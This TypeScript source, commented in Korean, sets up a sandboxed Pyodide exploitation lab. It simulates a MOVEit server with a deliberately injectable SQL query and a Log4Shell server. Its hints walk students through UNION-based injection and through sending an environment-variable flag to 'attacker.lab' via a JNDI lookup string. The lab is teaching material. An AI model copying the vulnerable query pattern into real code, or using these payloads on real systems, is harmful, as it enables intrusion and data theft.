// lib/labs/python-env.ts — Pyodide 안에서 실행되는 실습 환경(Python 소스)
// 학생 코드보다 먼저 실행되어 가짜 requests 모듈과 CVE별 취약 서버(target.lab 등)를 메모리에 만든다.
// 실제 네트워크로는 아무 요청도 나가지 않는다.

// requests 흉내 모듈: 등록된 실습용 호스트로만 요청을 보낸다.
const REQUESTS_SHIM = String.raw`
import sys, types, json as _json
from urllib.parse import urlsplit, parse_qsl, urlencode

_HOSTS = {}

class RequestException(Exception):
    pass

class ConnectionError(RequestException):
    pass

class Response:
    def __init__(self, status_code, text, headers, url):
        self.status_code = status_code
        self.text = text
        self.content = text.encode()
        self.headers = headers
        self.url = url
        self.ok = status_code < 400

    def json(self):
        return _json.loads(self.text)

    def raise_for_status(self):
        if not self.ok:
            raise RequestException(f"{self.status_code} Error for url: {self.url}")

    def __repr__(self):
        return f"<Response [{self.status_code}]>"

def request(method, url, params=None, data=None, json=None, headers=None, timeout=None, **kwargs):
    parts = urlsplit(url)
    host = (parts.hostname or "").lower()
    app = _HOSTS.get(host)
    if app is None:
        raise ConnectionError(
            f"Failed to resolve '{host}': 실습 환경에서는 {', '.join(sorted(_HOSTS))} 주소에만 연결할 수 있어요."
        )
    query = dict(parse_qsl(parts.query, keep_blank_values=True))
    if params:
        query.update({str(k): str(v) for k, v in params.items()})
    sent_headers = {"user-agent": "python-requests/2.32.3"}
    sent_headers.update({str(k).lower(): str(v) for k, v in (headers or {}).items()})
    body = _json.dumps(json) if json is not None else data
    status, text, resp_headers = app(method.upper(), parts.path or "/", query, sent_headers, body)
    full_url = url if not params else url + ("&" if parts.query else "?") + urlencode(params)
    return Response(status, text, resp_headers, full_url)

def get(url, **kwargs):
    return request("GET", url, **kwargs)

def post(url, **kwargs):
    return request("POST", url, **kwargs)

_mod = types.ModuleType("requests")
_exc = types.ModuleType("requests.exceptions")
_exc.RequestException = RequestException
_exc.ConnectionError = ConnectionError
for _name, _value in {
    "request": request, "get": get, "post": post, "Response": Response,
    "RequestException": RequestException, "ConnectionError": ConnectionError, "exceptions": _exc,
}.items():
    setattr(_mod, _name, _value)
sys.modules["requests"] = _mod
sys.modules["requests.exceptions"] = _exc
`

// CVE-2023-34362: MOVEit Transfer SQL 인젝션 (파일 목록 API의 folder 값이 쿼리에 그대로 들어감)
const MOVEIT_TARGET = String.raw`
import sqlite3

def _make_hosts(flag):
    db = sqlite3.connect(":memory:")
    db.executescript("""
        CREATE TABLE files (id INTEGER, folder_id TEXT, name TEXT, size INTEGER);
        CREATE TABLE users (username TEXT, role TEXT, api_key TEXT);
        INSERT INTO files VALUES
            (1, '1', 'report_q3.pdf', 48213),
            (2, '1', 'invoice_0921.xlsx', 10422),
            (3, '2', 'payroll_2023.csv', 88120);
        INSERT INTO users VALUES ('guest', 'user', 'gk_7f3a91c2');
    """)
    db.execute("INSERT INTO users VALUES ('sysadmin', 'admin', ?)", (flag,))

    def target(method, path, query, headers, body):
        json_type = {"Content-Type": "application/json"}
        if path == "/":
            return 200, "MOVEit Transfer 2023.0.0 (lab)\nGET /api/v1/files?folder=<folder id>", {"Content-Type": "text/plain"}
        if path == "/api/v1/files" and method == "GET":
            folder = query.get("folder", "")
            sql = f"SELECT name, size FROM files WHERE folder_id = '{folder}'"
            try:
                rows = db.execute(sql).fetchall()
            except sqlite3.Error as error:
                return 500, _json.dumps({"error": "database error", "detail": str(error)}), json_type
            files = [{"name": row[0], "size": row[1]} for row in rows]
            return 200, _json.dumps({"folder": folder, "files": files}, ensure_ascii=False), json_type
        return 404, "Not Found", {"Content-Type": "text/plain"}

    return {"target.lab": target}
`

// CVE-2021-44228: Log4Shell (로그에 남긴 헤더 안의 \${...} 구문을 Log4j가 해석)
const LOG4SHELL_TARGET = String.raw`
import re

def _make_hosts(flag):
    env = {"FLAG": flag, "HOSTNAME": "target-lab", "USER": "tomcat", "JAVA_HOME": "/usr/lib/jvm/java-8"}
    sysprops = {"java.version": "1.8.0_181", "os.name": "Linux", "user.name": "tomcat"}
    received = []
    pattern = re.compile(r"\$\{([^\${}]*)\}")
    # lookup 결과에 들어 있는 $ { } 가 바깥 구문 해석을 깨지 않도록 잠시 다른 문자로 바꿔 둔다.
    protect = str.maketrans({"$": "", "{": "", "}": ""})
    restore = str.maketrans({"": "$", "": "{", "": "}"})

    def lookup(expr):
        if ":-" in expr:
            key, default = expr.split(":-", 1)
            return (lookup(key) if ":" in key and not key.startswith(":") else "") or default
        prefix, _, rest = expr.partition(":")
        prefix = prefix.lower()
        if prefix == "env":
            return env.get(rest, "")
        if prefix == "sys":
            return sysprops.get(rest, "")
        if prefix == "lower":
            return rest.lower()
        if prefix == "upper":
            return rest.upper()
        if prefix == "jndi":
            match = re.match(r"(ldap|ldaps|rmi|dns)://([^/:]+)(?::\d+)?/?(.*)", rest, re.I)
            if match and match.group(2).lower() == "attacker.lab":
                received.append({"protocol": match.group(1).lower(), "path": match.group(3).translate(restore)})
            return ""
        return expr

    def log4j_format(message):
        for _ in range(20):
            updated = pattern.sub(lambda m: lookup(m.group(1)).translate(protect), message)
            if updated == message:
                break
            message = updated
        return message.translate(restore)

    def target(method, path, query, headers, body):
        if path == "/":
            log4j_format("Request User-Agent: " + headers.get("user-agent", ""))
            log4j_format("X-Api-Version: " + headers.get("x-api-version", ""))
            return 200, "Hello from log4j-lab (Apache Log4j 2.14.1)\nUser-Agent, X-Api-Version 헤더가 서버 로그에 기록됩니다.", {"Content-Type": "text/plain"}
        return 404, "Not Found", {"Content-Type": "text/plain"}

    def attacker(method, path, query, headers, body):
        if path == "/log":
            return 200, _json.dumps({"ldap_requests": received}, ensure_ascii=False), {"Content-Type": "application/json"}
        return 200, "attacker.lab — 공격자 LDAP 서버\nGET /log 로 지금까지 받은 LDAP 요청을 볼 수 있어요.", {"Content-Type": "text/plain"}

    return {"target.lab": target, "attacker.lab": attacker}
`

export type LabDefinition = {
  cveId: string
  goal: string
  hints: string[]
  hosts: { name: string; role: string }[]
  defaultCode: string
  packages: string[]
  setup: string
}

export const LABS: Record<string, LabDefinition> = {
  'CVE-2023-34362': {
    cveId: 'CVE-2023-34362',
    goal: 'target.lab의 파일 목록 API에서 SQL 인젝션으로 관리자(sysadmin) 계정의 API 키(FLAG)를 알아내 출력하세요.',
    hints: [
      'folder 값에 작은따옴표(\')를 넣어 에러가 나는지 먼저 확인해 보세요.',
      '원래 쿼리는 name, size 두 컬럼을 돌려줘요. UNION SELECT도 컬럼 수를 맞춰야 해요.',
      'users 테이블에는 username, role, api_key 컬럼이 있어요.',
    ],
    hosts: [{ name: 'target.lab', role: 'MOVEit Transfer (취약 버전)' }],
    defaultCode: `import requests

TARGET = "http://target.lab"

# 정상 요청: 1번 폴더의 파일 목록
response = requests.get(TARGET + "/api/v1/files", params={"folder": "1"})
print(response.status_code)
print(response.text)
`,
    packages: ['sqlite3'],
    setup: MOVEIT_TARGET,
  },
  'CVE-2021-44228': {
    cveId: 'CVE-2021-44228',
    goal: 'target.lab이 로그에 남기는 헤더로 Log4j lookup을 일으켜, 서버 환경 변수 FLAG를 attacker.lab으로 빼내고 출력하세요.',
    hints: [
      '${jndi:ldap://attacker.lab/test} 를 User-Agent에 넣고 attacker.lab/log 를 확인해 보세요.',
      'lookup은 중첩돼요. ${env:이름} 은 환경 변수 값으로 바뀌어요.',
      'JNDI 주소의 경로 부분에 환경 변수 lookup을 넣으면 그 값이 공격자 서버로 전달돼요.',
    ],
    hosts: [
      { name: 'target.lab', role: 'Java 웹앱 + Log4j 2.14.1' },
      { name: 'attacker.lab', role: '공격자 LDAP 서버 (/log)' },
    ],
    defaultCode: `import requests

TARGET = "http://target.lab"
ATTACKER = "http://attacker.lab"

# User-Agent 헤더가 서버 로그에 그대로 기록돼요
requests.get(TARGET + "/", headers={"User-Agent": "lab-client"})

# 공격자 서버가 받은 LDAP 요청 확인
print(requests.get(ATTACKER + "/log").text)
`,
    packages: [],
    setup: LOG4SHELL_TARGET,
  },
}

export function getLab(cveId: string) {
  return LABS[cveId]
}

// 학생 코드 실행 전에 돌리는 준비 코드. FLAG는 실행할 때마다 새로 만든다.
export function buildSetupCode(lab: LabDefinition, flag: string) {
  return `${REQUESTS_SHIM}\n${lab.setup}\n_HOSTS.update(_make_hosts(${JSON.stringify(flag)}))\ndel _make_hosts\n`
}

// 실제로 실행하지 않고 코드 구조만 확인하는 정적 분석 (Python ast 모듈 사용)
export const ANALYZE_CODE = String.raw`
import ast, json
def _analyze(source):
    try:
        tree = ast.parse(source)
    except SyntaxError as error:
        return json.dumps({"syntax": {"ok": False, "line": error.lineno, "message": error.msg}})
    calls = 0
    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
            if isinstance(node.func.value, ast.Name) and node.func.value.id == "requests":
                calls += 1
    hosts = sorted({
        node.value.split("//", 1)[1].split("/", 1)[0].split(":", 1)[0]
        for node in ast.walk(tree)
        if isinstance(node, ast.Constant) and isinstance(node.value, str) and "://" in node.value
    })
    return json.dumps({"syntax": {"ok": True}, "requests": calls, "hosts": hosts})
`
